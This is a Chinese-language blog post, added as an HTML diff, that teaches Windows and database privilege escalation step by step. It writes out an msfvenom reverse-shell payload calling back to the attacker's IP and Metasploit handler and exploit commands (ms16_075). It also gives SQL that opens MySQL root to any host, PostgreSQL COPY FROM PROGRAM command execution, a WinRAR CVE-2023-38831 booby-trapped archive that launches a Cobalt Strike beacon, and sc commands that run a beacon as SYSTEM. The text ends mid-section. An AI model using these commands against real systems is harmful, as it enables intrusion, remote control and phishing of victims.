@@ -1,0 +1,433 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        
+    
+    <link rel='stylesheet' href="/./css/dracula.css">
+
+        <title>权限提升</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=2.0">
+<link rel="stylesheet" href="/css/style.css">
+<link rel="shortcut icon" href="/favicon.ico">
+<link rel="apple-touch-icon" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="manifest" href="/site.webmanifest">
+
+    <meta name="generator" content="Hexo 6.3.0"></head>
+    <body>
+        <header class="al_header al_pos_fixed">
+    <div class="al_header_container dis_flex_jcenter">
+        <div class="al_header_container_left">
+            <div class="al_header_site_title">
+                <a href="/">Hexo</a>
+            </div>
+        </div>
+
+        <div class="dis_flex_jcenter">
+            <div class="al_header_setting">
+                <svg class="al_header_icon">
+                    <use xmlns="http://www.w3.org/2000/svg" xlink:href="/assets/svg_icons.svg#svg-menu"></use>
+                </svg>
+            </div>
+        </div>
+    </div>
+</header>
+
+        <div class="al_sidebar">
+
+    <div class="al_sidebar_overlay al_full_cover"></div>
+
+    <div class="al_pos_fixed al_sidebar_cnt">
+        <div class="dis_flex_acenter al_sidebar_header">
+            <h3>Hexo</h3>
+            <div class="al_sidebar_close al_header_setting">
+                <svg class="al_header_icon">
+                    <use xmlns="http://www.w3.org/2000/svg" xlink:href="/assets/svg_icons.svg#svg-close"></use>
+                </svg>
+            </div>
+        </div>
+
+        <div class="al_sidebar_author_cnt">
+
+            <div class="al_sidebar_author_info">
+                <h4>znskiw</h4>
+                <img class="al_sidebar_avatar" src="https://yourAvatorURL">
+                <p></p>
+            </div>
+
+            
+        </div>
+    </div>
+</div>
+
+        
+    <div class="dis_flex_center al_lightbox_cnt al_full_cover">
+        <img class="al_lightbox_img"/>
+    </div>
+    <div class="al_page_background dis_flex_center al_full_cover"></div>
+    <div class="al_page_container">
+        <div class="al_pos_ab al_fake_background"></div>
+        <div class="al_main_container al_shadow al_main_page_container">
+            <article class="al_article">
+                <header>
+                    <h1 class="al_page_title">
+                        权限提升
+                    </h1>
+                    <div class="al_page_info dis_flex">
+                        <div class="al_page_content_info">
+                            Fri February 23, 2024 08:35 PM
+                        </div>
+
+                        
+
+                        
+                        <span class="tags"></span>
+                    </div>
+                </header>
+
+                
+                    <div class="al_page_content_outline">
+                        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#web%E6%9D%83%E9%99%90%E5%88%B0%E7%B3%BB%E7%BB%9F%E6%9D%83%E9%99%90"><span class="toc-text">web权限到系统权限</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E6%8F%90%E7%9F%A5%E8%AF%86"><span class="toc-text">前提知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7%E6%8F%90%E6%9D%83"><span class="toc-text">工具提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#MSF%E6%8F%90%E6%9D%83"><span class="toc-text">MSF提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cs%E6%8F%90%E6%9D%83"><span class="toc-text">cs提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%93%A5%E6%96%AF%E6%8B%89%E6%8F%90%E6%9D%83%E5%AE%9D%E5%A1%94"><span class="toc-text">哥斯拉提权宝塔</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%BA%E5%B7%A5%E6%8F%90%E6%9D%83"><span class="toc-text">人工提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%AD%9B%E9%80%89"><span class="toc-text">漏洞筛选</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP%E8%8E%B7%E5%8F%96"><span class="toc-text">EXP获取</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9C%9F%E8%B1%86%E5%AE%B6%E6%97%8F"><span class="toc-text">土豆家族</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83"><span class="toc-text">数据库提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83%E6%B5%81%E7%A8%8B"><span class="toc-text">数据库提权流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MSSQL%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-text">MSSQL数据库</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MYSQL%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-text">MYSQL数据库</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Oracle%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-text">Oracle数据库</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PostgreSQL%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-text">PostgreSQL数据库</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Redis%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-text">Redis数据库</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Memcached%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-text">Memcached数据库</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E6%96%B9%E8%BD%AF%E4%BB%B6%E6%8F%90%E6%9D%83"><span class="toc-text">第三方软件提权</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#windows%E7%AE%A1%E7%90%86%E5%91%98%E6%9D%83%E9%99%90%E5%88%B0%E7%B3%BB%E7%BB%9F%E6%9D%83%E9%99%90"><span class="toc-text">windows管理员权限到系统权限</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E5%90%AF%E5%8A%A8%E6%8F%90%E6%9D%83"><span class="toc-text">服务启动提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6"><span class="toc-text">远程控制</span></a></li></ol></li></ol>
+                    </div>
+                
+
+                
+                <section id="post-body">
+                    <h1 id="web权限到系统权限"><a href="#web权限到系统权限" class="headerlink" title="web权限到系统权限"></a>web权限到系统权限</h1><h2 id="前提知识"><a href="#前提知识" class="headerlink" title="前提知识"></a>前提知识</h2><ul>
+<li>web搭建平台差异</li>
+</ul>
+<ol>
+<li><p>集成软件：宝塔，PhpStudy，XAMMP等：</p>
+<p>web权限非常高，就是win权限，但是宝塔有防护策略，需要绕过一些东西</p>
+</li>
+<li><p>自行搭建：自己一个个下载安装搭建配置：</p>
+<p>正常web权限，需要提权到win权限</p>
+</li>
+<li><p>虚拟化：Docker，ESXi，QEMU，Hyper-V等：</p>
+<p>要先逃离，再提权</p>
+</li>
+</ol>
+<ul>
+<li>Web语言权限差异：</li>
+</ul>
+<p>ASP&#x2F;ASP.NET&#x2F;PHP&#x2F;JSP等</p>
+<p>权限高低：JSP&gt;ASP.NET&gt;ASP&#x3D;PHP，jsp一般进去是直接到了win权限</p>
+<ul>
+<li>系统用户权限差异</li>
+</ul>
+<ol>
+<li><p>Windows：</p>
+<p>从高到低：</p>
+<p>System：系统组，拥有管理系统资源的权限，包括文件、目录和注册表等。</p>
+<p>Administrators：管理员组，具有对计算机进行完全访问和操作的权限。</p>
+<p>Users：用户组，一般用户的默认组别，拥有较低的系统权限。</p>
+<p>Guests：</p>
+<p>访客组，可以访问计算机上的公共文件夹和打印机，但不能更改配置和安装程序。</p>
+<p>Backup Operators：</p>
+<p>备份操作员组，允许用户备份和还原数据，但不能更改配置安装程序。</p>
+<p>Power Users：高级用户组，拥有比一般用户更高的系统权限，但比管理员组权限低。</p>
+<p>Remote Desktop Users：远程桌面用户组，允许用户进行远程桌面连接。</p>
+<p>Network Configuration Operators：网络配置操作员组，允许用户管理网络配置。</p>
+<p>Performance Log Users：性能日志用户组，允许用户收集性能日志和计数器数据。</p>
+<p>Distributed COM Users：</p>
+<p>分布式 COM 用户组，允许用户使用分布式 COM 连接到计算机。</p>
+<p>IIS_IUSRS: 用于授权IIS相关服务的用户组。</p>
+</li>
+<li><p>Linux：</p>
+<p>系统用户：UID(0-999)</p>
+<p>普通用户：UID(1000-*)</p>
+<p>root用户：UID为0，拥有系统的完全控制权限</p>
+</li>
+</ol>
+<h2 id="工具提权"><a href="#工具提权" class="headerlink" title="工具提权"></a>工具提权</h2><h3 id="MSF提权"><a href="#MSF提权" class="headerlink" title="MSF提权"></a>MSF提权</h3><p>环境用的是装IIS+ASP的Windows 2008，权限是很低的权限</p>
+<p><img src="/2024/02/23/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/1.png" alt="1"></p>
+<p>生成exe后门：</p>
+<p><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.174.151 LPORT=3333 -f exe -o msf.exe</code>，中间是攻击机的ip，将后门利用哥斯拉文件管理模块上传</p>
+<p>启动哥斯拉，配置监听会话模块</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">show options</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/02/23/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/2.png" alt="2"></p>
+<p>看到lhost没设置，lport和前面生成后门时的不一样，修改一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set lhost 0.0.0.0</span><br><span class="line">set lport 3333</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p>在哥斯拉里，启动目标的<code>msf.exe</code>，成功监听，可以执行命令，使用<code>background</code>退出</p>
+<p><img src="/2024/02/23/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/3.png" alt="3"></p>
+<p>使用筛选EXP模块，别系统中可能被利用的漏洞</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use post/multi/recon/local_exploit_suggester</span><br><span class="line">set showdescription true</span><br><span class="line">show options</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/02/23/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/4.png" alt="4"></p>
+<p>看到session那里还没填，可以用<code>sessions</code>命令查看现在的session</p>
+<p><img src="/2024/02/23/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/5.png" alt="5"></p>
+<p>我们要的就是这个id为1的，所以使用命令<code>set session 1</code>,<code>run</code>运行，绿色就是可能存在的漏洞</p>
+<p><img src="/2024/02/23/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/6.png" alt="6"></p>
+<p>这里我使用的msf6.3有bug，实际上他的漏洞是红色那块的exploit&#x2F;windows&#x2F;local&#x2F;ms16_075_reflection_juicy，最后就利用这个漏洞进行提权</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">background</span><br><span class="line">use exploit/windows/local/ms16_075_reflection_juicy</span><br><span class="line">show options</span><br><span class="line">set session 1</span><br><span class="line">run </span><br></pre></td></tr></table></figure>
+
+<h3 id="cs提权"><a href="#cs提权" class="headerlink" title="cs提权"></a>cs提权</h3><p>环境用的是装IIS+ASP.NET的Windows 2016，从这个和上面那个环境的哥斯拉功能的对比，也能看出上面前提知识里面提到的权限大小ASP.NET&gt;ASP</p>
+<p><img src="/2024/02/23/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/7.png" alt="7"></p>
+<p>生成一个cs的exe后门，用哥斯拉文件管理模块上传，运行，上线，修改回连间隔为0，让消息通讯更及时。用LSTAR插件的权限提升的badpotato（beichendream）模块，执行whoami，发现回显的是system，可知提权成功，但是这只是能使用来执行一条命令，我们可以使用这个模块来执行下<code>cs.exe</code>命令，来再上线一个system权限的机器</p>
+<h3 id="哥斯拉提权宝塔"><a href="#哥斯拉提权宝塔" class="headerlink" title="哥斯拉提权宝塔"></a>哥斯拉提权宝塔</h3><p>环境用的是装宝塔Apache+PHP的Windows 2012，可以看到宝塔的防护措施，执行命令的函数被禁用，文件也只能看当前目录下的，不能看其他目录的</p>
+<p><img src="/2024/02/23/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/8.png" alt="8"></p>
+<p><img src="/2024/02/23/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/9.png" alt="9"></p>
+<p>可以用哥斯拉自带的宝塔绕过工具</p>
+<ul>
+<li>第一个是BypassOpenBaseDir，php里设置目录能不能访问的是php.ini</li>
+</ul>
+<p>里面的OpenBaseDir，所以这是绕过目录现在，点击一下BypassOpenBaseDir这一串字，弹窗ok即成功绕过</p>
+<p>第二个是BypassDisableFunction，绕过禁用的函数，run一下就能执行</p>
+<p>第三个是PMeterpreter，反弹msf。根据上面的命令，一行一行输到msf里，把哥斯拉里的host改成攻击机的ip即可，反弹后，可以看到直接变成了system权限，证明了上面前提知识里的集成软件的web权限就是web权限</p>
+<p><img src="/2024/02/23/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/11.png" alt="11"></p>
+<h2 id="人工提权"><a href="#人工提权" class="headerlink" title="人工提权"></a>人工提权</h2><p>如果提权中无法执行命令的话，可以尝试上传cmd.exe到可读写目录再调用</p>
+<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>查看用户和权限：whoami</p>
+<p>查看系统信息：systeminfo</p>
+<h3 id="漏洞筛选"><a href="#漏洞筛选" class="headerlink" title="漏洞筛选"></a>漏洞筛选</h3><p>在线网站：<a target="_blank" rel="noopener" href="https://i.hacking8.com/tiquan%EF%BC%8C%E6%8A%8Asysteminfo%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%93%E6%9E%9C%E5%85%A8%E9%83%A8%E5%A4%8D%E5%88%B6%E8%BF%9B%E5%8E%BB">https://i.hacking8.com/tiquan，把systeminfo命令执行结果全部复制进去</a></p>
+<p>工具：<a target="_blank" rel="noopener" href="https://github.com/bitsadmin/wesng%EF%BC%8C%E6%8A%8Asysteminfo%E6%89%A7%E8%A1%8C%E7%BB%93%E6%9E%9C%E5%A4%8D%E5%88%B6%E5%88%B0systeminfo.txt%E9%87%8C">https://github.com/bitsadmin/wesng，把systeminfo执行结果复制到systeminfo.txt里</a></p>
+<p><img src="/2024/02/23/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/12.png" alt="12"></p>
+<h3 id="EXP获取"><a href="#EXP获取" class="headerlink" title="EXP获取"></a>EXP获取</h3><ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/Ascotbe/Kernelhub%EF%BC%9A%E9%92%88%E5%AF%B9%E7%BC%96%E5%8F%B7%E6%8C%87%E5%AE%9A%E6%89%BEEXP%EF%BC%8C%E4%BC%98%E5%85%88%E5%B0%9D%E8%AF%95http://kernelhub.ascotbe.com/Windows/Docs/#/TestSuccess%E8%BF%99%E9%87%8C%E7%9A%84%E6%BC%8F%E6%B4%9E%EF%BC%88%E8%BF%99%E9%87%8C%E9%9D%A2%E6%98%AF%E5%B7%B2%E7%BB%8F%E8%A2%AB%E6%B5%8B%E8%AF%95%E6%88%90%E5%8A%9F%E8%BF%87%E7%9A%84%EF%BC%89">https://github.com/Ascotbe/Kernelhub：针对编号指定找EXP，优先尝试http://kernelhub.ascotbe.com/Windows/Docs/#/TestSuccess这里的漏洞（这里面是已经被测试成功过的）</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/nomi-sec/PoC-in-GitHub%EF%BC%9A%E9%92%88%E5%AF%B9%E5%B9%B4%E4%BB%BD%E6%8C%87%E5%AE%9A%E6%89%BEEXP">https://github.com/nomi-sec/PoC-in-GitHub：针对年份指定找EXP</a></li>
+</ul>
+<h2 id="土豆家族"><a href="#土豆家族" class="headerlink" title="土豆家族"></a>土豆家族</h2><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/OW4ybuqtErh_ovkTWLSr8w">https://mp.weixin.qq.com/s/OW4ybuqtErh_ovkTWLSr8w</a></p>
+<p>土豆(potato)提权通常用在我们获取WEB&#x2F;数据库权限的时候，可以将低权限的服务用户提升为“NT AUTHORITY\SYSTEM”特权。</p>
+<p>GodPotato</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/BeichenDream/GodPotato">https://github.com/BeichenDream/GodPotato</a></p>
+<p>SweetPotato</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/CCob/SweetPotato">https://github.com/CCob/SweetPotato</a></p>
+<p>RoguePotato</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/antonioCoco/RoguePotato">https://github.com/antonioCoco/RoguePotato</a></p>
+<p>BadPotato</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/BeichenDream/BadPotato">https://github.com/BeichenDream/BadPotato</a></p>
+<p>EfsPotato</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/zcgonvh/EfsPotato">https://github.com/zcgonvh/EfsPotato</a></p>
+<p>MultiPotato</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/S3cur3Th1sSh1t/MultiPotato">https://github.com/S3cur3Th1sSh1t/MultiPotato</a></p>
+<p>CandyPotato</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/klezVirus/CandyPotato">https://github.com/klezVirus/CandyPotato</a></p>
+<p>RasmanPotato</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/crisprss/RasmanPotato">https://github.com/crisprss/RasmanPotato</a></p>
+<p>PetitPotato</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/wh0amitz/PetitPotato">https://github.com/wh0amitz/PetitPotato</a></p>
+<p>JuicyPotatoNG</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/antonioCoco/JuicyPotatoNG">https://github.com/antonioCoco/JuicyPotatoNG</a></p>
+<p>PrintNotifyPotato</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/BeichenDream/PrintNotifyPotato">https://github.com/BeichenDream/PrintNotifyPotato</a></p>
+<p>CoercedPotato</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/Prepouce/CoercedPotato">https://github.com/Prepouce/CoercedPotato</a></p>
+<p>使用方法：上传exe文件，执行exe文件即可（一些直接执行，一些直接执行会告诉怎么执行命令，或者见上面那个文章）</p>
+<p><img src="/2024/02/23/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/13.png" alt="13"></p>
+<h1 id="数据库提权"><a href="#数据库提权" class="headerlink" title="数据库提权"></a>数据库提权</h1><h2 id="数据库提权流程"><a href="#数据库提权流程" class="headerlink" title="数据库提权流程"></a>数据库提权流程</h2><ol>
+<li><p>先获取到数据库用户密码</p>
+<ul>
+<li><p>网站存在SQL注入漏洞</p>
+</li>
+<li><p>数据库的存储文件或备份文件</p>
+</li>
+<li><p>网站应用源码中的数据库配置文件</p>
+</li>
+<li><p>采用工具或脚本爆破(需解决外联问题)</p>
+</li>
+</ul>
+</li>
+<li><p>利用数据库提权项目进行连接</p>
+<ul>
+<li><p>MDUT（<a target="_blank" rel="noopener" href="https://github.com/SafeGroceryStore/MDUT%EF%BC%89">https://github.com/SafeGroceryStore/MDUT）</a></p>
+</li>
+<li><p>RequestTemplate（<a target="_blank" rel="noopener" href="https://github.com/1n7erface/RequestTemplate%EF%BC%89">https://github.com/1n7erface/RequestTemplate）</a></p>
+</li>
+</ul>
+</li>
+<li><p>利用已知权限执行SQL开启外联（让数据库支持外联）</p>
+<p>mysql：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GRANT ALL PRIVILEGES ON *.* TO &#x27;帐号&#x27;@&#x27;%&#x27; IDENTIFIED BY &#x27;密码&#x27; WITH GRANT OPTION;</span><br><span class="line"></span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></figure>
+
+<p>MSSQL：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;, 1;</span><br><span class="line"></span><br><span class="line">RECONFIGURE;</span><br><span class="line"></span><br><span class="line">EXEC sp_configure &#x27;Ad Hoc Distributed Queries&#x27;, 1;</span><br><span class="line"></span><br><span class="line">RECONFIGURE;</span><br></pre></td></tr></table></figure>
+
+<p>Oracle：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ALTER SYSTEM SET REMOTE_LOGIN_PASSWORDFILE=EXCLUSIVE SCOPE=SPFILE;</span><br><span class="line"></span><br><span class="line">SHUTDOWN IMMEDIATE;</span><br><span class="line"></span><br><span class="line">STARTUP;</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h2 id="MSSQL数据库"><a href="#MSSQL数据库" class="headerlink" title="MSSQL数据库"></a>MSSQL数据库</h2><ul>
+<li><p>端口：1433</p>
+</li>
+<li><p>条件：sa密码</p>
+</li>
+<li><p>MDUT：右键新增，选择mssql，输入ip，端口（1433），用户（sa），密码，保存</p>
+</li>
+</ul>
+<p><img src="/2024/02/23/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/14.png" alt="14"></p>
+<p>右键进入，可以以管理员权限执行命令，不行的话可以在功能选择里激活组件，或者换一个模式执行</p>
+<p><img src="/2024/02/23/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/15.png" alt="15"></p>
+<ul>
+<li>RequestTemplate：点击生成目标文本，选择下数据库，输入ip，端口（1433），用户（sa），密码，generate,导出</li>
+</ul>
+<p><img src="/2024/02/23/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/16.png" alt="16"></p>
+<p>右键新增，文件选择刚刚导出的，确认，再右键进入，选择数据库类型，开启连接，就能执行命令</p>
+<p><img src="/2024/02/23/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/17.png" alt="17"></p>
+<h2 id="MYSQL数据库"><a href="#MYSQL数据库" class="headerlink" title="MYSQL数据库"></a>MYSQL数据库</h2><ul>
+<li><p>端口：3306</p>
+</li>
+<li><p>条件：ROOT密码且高版本my.ini里的secure-file-priv没进行目录限制</p>
+</li>
+</ul>
+<p>数据库账号密码：</p>
+<p><img src="/2024/02/23/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/18.png" alt="18"></p>
+<ul>
+<li>MDUT：和刚刚一样输入，但是遇到了问题</li>
+</ul>
+<p><img src="/2024/02/23/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/19.png" alt="19"></p>
+<p>这是因为mysql数据库的root用户是默认不支持外联的，可以在哥斯拉里使用sql语句来让数据库支持外联</p>
+<p><img src="/2024/02/23/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/20.png" alt="20"></p>
+<p>可以看到执行后在user这张表里多了host为%的一行，百分号的意思为任意连接，就是任意连接都能连接root用户。执行完MDUT就能正常连接了，可以执行命令，执行不了点下udf提权就行了</p>
+<h2 id="Oracle数据库"><a href="#Oracle数据库" class="headerlink" title="Oracle数据库"></a>Oracle数据库</h2><ul>
+<li><p>端口：1521</p>
+</li>
+<li><p>这个一般不用提权，因为Oracle通常配合jsp使用，而jsp上线后一般直接是管理员权限。偶尔，比如站库分离或不是通过web获得数据库权限的时候使用</p>
+</li>
+<li><p>条件：数据库用户密码</p>
+</li>
+<li><p>工具使用同上</p>
+</li>
+</ul>
+<h2 id="PostgreSQL数据库"><a href="#PostgreSQL数据库" class="headerlink" title="PostgreSQL数据库"></a>PostgreSQL数据库</h2><ul>
+<li><p>端口：5432</p>
+</li>
+<li><p>条件：数据库用户密码</p>
+</li>
+<li><p>在使用工具时可以看到一般有这三个漏洞选项：CVE-2019-9193、UDF、libc，一般选择CVE-2019-9193漏洞，因为UDF提权需要secure-file-priv没进行目录限制，但是高版本默认说开启的，libc漏洞从2017年之后的版本就已经不存在了</p>
+</li>
+<li><p>手工提权：</p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DROP TABLE IF EXISTS cmd_exec;</span><br><span class="line">CREATE TABLE cmd_exec(cmd_output text);</span><br><span class="line">COPY cmd_exec FROM PROGRAM &#x27;id&#x27;;</span><br><span class="line">SELECT * FROM cmd_exec;</span><br></pre></td></tr></table></figure>
+
+<p>不过可以看到，权限提权后也不是特别大</p>
+<p><img src="/2024/02/23/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/21.png" alt="21"></p>
+<ul>
+<li>工具使用同上</li>
+</ul>
+<h2 id="Redis数据库"><a href="#Redis数据库" class="headerlink" title="Redis数据库"></a>Redis数据库</h2><ul>
+<li><p>端口：6379</p>
+</li>
+<li><p>这个数据库不像前面那几种可以存储各种信息，这个数据库是专门存储键值对的</p>
+</li>
+<li><p>条件：利用未授权或密码连接后执行（Redis数据库没有用户名，只有密码。未授权连接的意思是设置密码为空，就不需要密码就能直接进来了）</p>
+</li>
+<li><p>工具使用同上</p>
+</li>
+</ul>
+<h2 id="Memcached数据库"><a href="#Memcached数据库" class="headerlink" title="Memcached数据库"></a>Memcached数据库</h2><ul>
+<li><p>端口：11211</p>
+</li>
+<li><p>这个数据库也是专门存储键值对的</p>
+</li>
+<li><p>条件：设置远程可访问或取得本地权限后访问（这个数据库没有账号密码，直接通过ip和端口连接，全看数据库设置是否运行非本地连接）</p>
+</li>
+<li><p>工具方面只能使用RequestTemplate，连接后可以发现，他和其他的数据库连接之后不一样，他没有执行命令或者反弹shell之类的利用。Memcached数据库一般不直接利用于提权，他的主要目的是用于找敏感信息，比如找到另一个数据库的账号密码，然后进行连接，比如这样</p>
+</li>
+</ul>
+<p><img src="/2024/02/23/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/22.png" alt="22"></p>
+<p><img src="/2024/02/23/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/23.png" alt="23"></p>
+<p>实例参考<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/V_p1heyM-2HxsaFLRs9qeg">https://mp.weixin.qq.com/s/V_p1heyM-2HxsaFLRs9qeg</a></p>
+<h1 id="第三方软件提权"><a href="#第三方软件提权" class="headerlink" title="第三方软件提权"></a>第三方软件提权</h1><ul>
+<li>例子：</li>
+</ul>
+<p>远控类：Teamviewer 向日葵 Todesk VNC Radmin等</p>
+<p>密码类：各大浏览器 Xshell Navicat 3389 等</p>
+<p>服务类：FileZilla Serv-u Zend等</p>
+<p>文档类：Winrar WPS Office等</p>
+<ul>
+<li>原理：</li>
+</ul>
+<p>1、通过普通用户或Web用户收集或提取有价值凭据进行提升（比如上面的远控类、密码类、服务类，但是这些很大一部分是要用户权限，web权限是不够的）</p>
+<p>2、通过普通用户或Web用户上传类似钓鱼文件等待管理提升（比如上面的文档类）</p>
+<ul>
+<li>发现第三方软件：</li>
+</ul>
+<p>可以通过webshell文件管理找安装的程序，或者使用<code>net start</code>查看开启了什么服务</p>
+<ul>
+<li>使用：</li>
+</ul>
+<p>举一个winrar的例子，使用CVE-2023-38831。</p>
+<p>在同一个文件夹下，放CVE-2023-38831.py，一个任意pdf文件，一个script.bat文件，内容写</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cs.exe &amp;</span><br><span class="line">qq.pdf</span><br></pre></td></tr></table></figure>
+
+<p>在cmd里执行<code>python D:\Desktop\zn\CVE-2023-38831.py qq.pdf script.bat qq.rar</code>，就能生成qq.rar文件，把一整个文件上传到目标服务器，等对方点击qq.pdf文件，我们的cs就能上线</p>
+<p><img src="/2024/02/23/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/24.png" alt="24"></p>
+<h1 id="windows管理员权限到系统权限"><a href="#windows管理员权限到系统权限" class="headerlink" title="windows管理员权限到系统权限"></a>windows管理员权限到系统权限</h1><h2 id="服务启动提权"><a href="#服务启动提权" class="headerlink" title="服务启动提权"></a>服务启动提权</h2><p>sc是用于与服务控制管理器和服务进行通信的命令行程序。</p>
+<p>适用版本：windows 7、10、08、12、16、19、22。早期版本用at命令</p>
+<ul>
+<li>方法：</li>
+</ul>
+<ol>
+<li>创建一个名叫syscmd的执行文件服务，<code>sc Create syscmd binPath= &quot;c:\cs。exe&quot;</code>（要写绝对路径）</li>
+<li>运行服务，<code>sc start syscmd</code></li>
+</ol>
+<ul>
+<li>原理：</li>
+</ul>
